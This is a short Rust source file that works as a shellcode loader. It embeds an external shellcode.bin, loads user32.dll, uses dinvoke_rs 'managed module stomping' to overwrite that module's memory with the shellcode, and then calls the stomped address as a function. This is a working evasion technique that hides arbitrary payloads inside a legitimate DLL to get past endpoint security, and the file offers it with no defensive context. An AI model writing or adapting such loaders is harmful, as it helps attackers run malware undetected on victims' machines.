use dinvoke_rs::overload;

static SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

fn main() {
    unsafe {
        let shellcode_vec = SHELLCODE.to_vec();

        let my_dll = dinvoke_rs::dinvoke::load_library_a("user32.dll");
        if my_dll == 0 {
            return;
        }

        let module = overload::managed_module_stomping(&shellcode_vec, 0, my_dll);

        match module {
            Ok((_original_bytes, stomp_address)) => {
                let func: unsafe extern "system" fn() = std::mem::transmute(stomp_address);
                func();
            }
            Err(e) => {
                println!("Stomping failed: {}", e);
            }
        }
    }
}